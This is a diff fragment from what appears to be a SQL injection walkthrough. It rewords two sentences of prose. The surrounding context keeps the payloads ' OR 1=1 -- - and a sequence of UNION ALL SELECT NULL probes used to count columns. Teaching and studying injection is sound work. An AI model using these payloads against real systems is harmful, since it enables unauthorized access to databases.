@@ -103,7 +103,7 @@ The payload that worked stabilizing the query without errors is:
 
   	' OR 1=1 -- -
 
-To find the Column count in the current table so that we can work with we type:
+To find the Column count in the current table to work with, we type:
 
     ' OR 1=1 UNION ALL SELECT NULL
 
@@ -111,7 +111,7 @@ To find the Column count in the current table so that we can work with we type:
   
     “The used SELECT statements have a different number of columns”
 
-We continue adding NULL values until something returns without errors:
+We continue adding NULL values until it returns no error:
 
     ' OR 1=1 UNION ALL SELECT NULL,NULL
     ' OR 1=1 UNION ALL SELECT NULL,NULL,NULL
